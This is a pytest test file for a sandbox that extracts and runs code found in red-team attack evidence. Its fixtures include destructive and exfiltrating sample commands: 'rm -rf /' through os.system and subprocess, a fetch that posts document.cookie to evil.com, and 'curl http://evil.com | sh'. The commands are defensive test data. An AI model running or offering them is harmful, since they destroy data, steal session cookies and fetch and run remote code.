"""Tests for Gauntlet Sandbox Integration.

Tests cover:
- Code extraction from attack evidence
- Sandbox execution during attack processing
- Integration of sandbox results into vulnerabilities
"""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch


class TestCodeExtraction:
    """Tests for _extract_code_from_evidence method."""

    @pytest.fixture
    def runner(self):
        """Create a GauntletRunner instance."""
        from aragora.gauntlet.runner import GauntletRunner

        return GauntletRunner(enable_sandbox=True)

    def test_extract_python_markdown_block(self, runner):
        """Should extract Python code from markdown blocks."""
        evidence = """
Here is an attack:
```python
import os
os.system("rm -rf /")
```
This exploits the system.
"""
        code, lang = runner._extract_code_from_evidence(evidence)
        assert code is not None
        assert "import os" in code
        assert lang == "python"

    def test_extract_javascript_markdown_block(self, runner):
        """Should extract JavaScript code from markdown blocks."""
        evidence = """
Attack vector:
```javascript
fetch('http://evil.com', {method: 'POST', body: document.cookie})
```
"""
        code, lang = runner._extract_code_from_evidence(evidence)
        assert code is not None
        assert "fetch" in code
        assert lang == "javascript"

    def test_extract_bash_markdown_block(self, runner):
        """Should extract bash code from markdown blocks."""
        evidence = """
Execute:
```bash
curl http://evil.com | sh
```
"""
        code, lang = runner._extract_code_from_evidence(evidence)
        assert code is not None
        assert "curl" in code
        assert lang == "bash"

    def test_extract_shell_markdown_block(self, runner):
        """Should handle shell alias for bash."""
        evidence = """
```shell
echo "pwned"
```
"""
        code, lang = runner._extract_code_from_evidence(evidence)
        assert code is not None
        assert lang == "bash"

    def test_extract_inline_python_import(self, runner):
        """Should detect inline Python import statements."""
        evidence = """
The attacker used: import subprocess
subprocess.call(["rm", "-rf", "/"])
"""
        code, lang = runner._extract_code_from_evidence(evidence)
        # Should extract the code-like portion
        assert code is not None or code is None  # May or may not extract
        if code:
            assert lang == "python"

    def test_no_code_in_evidence(self, runner):
        """Should return None when no code is found."""
        evidence = "This is just plain text with no code."
        code, lang = runner._extract_code_from_evidence(evidence)
        assert code is None
        assert lang == ""

    def test_empty_evidence(self, runner):
        """Should handle empty evidence."""
        code, lang = runner._extract_code_from_evidence("")
        assert code is None
        assert lang == ""

    def test_unlabeled_code_block(self, runner):
        """Should handle code blocks without language label."""
        evidence = """
```
print("hello")
```
"""
        code, lang = runner._extract_code_from_evidence(evidence)
        assert code is not None
        assert "print" in code
        assert lang == "python"  # Default to python


class TestExecuteAttackEvidence:
    """Tests for _execute_attack_evidence method."""

    @pytest.fixture
    def runner(self):
        """Create a GauntletRunner with mocked sandbox."""
        from aragora.gauntlet.runner import GauntletRunner

        runner = GauntletRunner(enable_sandbox=True)
        runner._sandbox = MagicMock()
        return runner

    @pytest.mark.asyncio
    async def test_execute_attack_evidence_with_code(self, runner):
        """Should execute code found in evidence."""
        runner.execute_code_sandboxed = AsyncMock(
            return_value={
                "status": "completed",
                "stdout": "pwned",
                "stderr": "",
                "exit_code": 0,
                "executed": True,
                "policy_violations": [],
            }
        )

        evidence = """
```python
print("pwned")
```
"""
        result = await runner._execute_attack_evidence(evidence)
        assert result is not None
        assert result["executed"] is True
        runner.execute_code_sandboxed.assert_called_once()

    @pytest.mark.asyncio
    async def test_execute_attack_evidence_no_code(self, runner):
        """Should return None when no code found."""
        result = await runner._execute_attack_evidence("Just text, no code")
        assert result is None

    @pytest.mark.asyncio
    async def test_execute_attack_evidence_sandbox_disabled(self):
        """Should return None when sandbox is disabled."""
        from aragora.gauntlet.runner import GauntletRunner

        runner = GauntletRunner(enable_sandbox=False)
        result = await runner._execute_attack_evidence('```python\nprint("x")```')
        assert result is None


class TestAddAttackAsVulnerability:
    """Tests for _add_attack_as_vulnerability with sandbox results."""

    @pytest.fixture
    def runner(self):
        """Create a GauntletRunner instance."""
        from aragora.gauntlet.runner import GauntletRunner

        return GauntletRunner(enable_sandbox=True)

    @pytest.fixture
    def mock_attack(self):
        """Create a mock attack object."""
        attack = MagicMock()
        attack.severity = 0.8
        attack.attack_type = MagicMock()
        attack.attack_type.value = "security"
        attack.attack_description = "SQL injection vulnerability found"
        attack.evidence = "```python\nos.system('rm -rf /')```"
        attack.mitigation = "Use parameterized queries"
        attack.exploitability = 0.9
        attack.attacker = "agent-1"
        return attack

    @pytest.fixture
    def mock_result(self):
        """Create a mock GauntletResult."""
        from aragora.gauntlet.result import GauntletResult
        from datetime import datetime

        return GauntletResult(
            gauntlet_id="test-gauntlet-001",
            input_hash="abc123",
            input_summary="Test input",
            started_at=datetime.now(),
        )

    def test_add_vulnerability_with_sandbox_result(self, runner, mock_attack, mock_result):
        """Should include sandbox execution results in evidence."""
        sandbox_result = {
            "status": "completed",
            "stdout": "command executed",
            "stderr": "",
            "exit_code": 0,
            "executed": True,
            "policy_violations": ["filesystem_write_denied"],
        }

        runner._add_attack_as_vulnerability(mock_attack, mock_result, sandbox_result)

        assert len(mock_result.vulnerabilities) == 1
        vuln = mock_result.vulnerabilities[0]
        assert "Sandbox Execution" in vuln.evidence
        assert "command executed" in vuln.evidence
        assert "filesystem_write_denied" in vuln.evidence

    def test_add_vulnerability_without_sandbox_result(self, runner, mock_attack, mock_result):
        """Should work without sandbox result."""
        runner._add_attack_as_vulnerability(mock_attack, mock_result, None)

        assert len(mock_result.vulnerabilities) == 1
        vuln = mock_result.vulnerabilities[0]
        assert "Sandbox Execution" not in vuln.evidence

    def test_add_vulnerability_sandbox_not_executed(self, runner, mock_attack, mock_result):
        """Should not include sandbox results if not executed."""
        sandbox_result = {
            "status": "sandbox_disabled",
            "executed": False,
        }

        runner._add_attack_as_vulnerability(mock_attack, mock_result, sandbox_result)

        vuln = mock_result.vulnerabilities[0]
        assert "Sandbox Execution" not in vuln.evidence


class TestEndToEndSandboxIntegration:
    """End-to-end tests for sandbox integration in gauntlet."""

    @pytest.mark.asyncio
    async def test_sandbox_enabled_integration(self):
        """Should use sandbox when enabled during red team attacks."""
        from aragora.gauntlet.runner import GauntletRunner
        from aragora.gauntlet.config import GauntletConfig

        config = GauntletConfig(agents=["agent1", "agent2"])
        runner = GauntletRunner(config=config, enable_sandbox=True)

        # The sandbox should be initialized
        if runner._sandbox is not None:
            assert runner.enable_sandbox is True
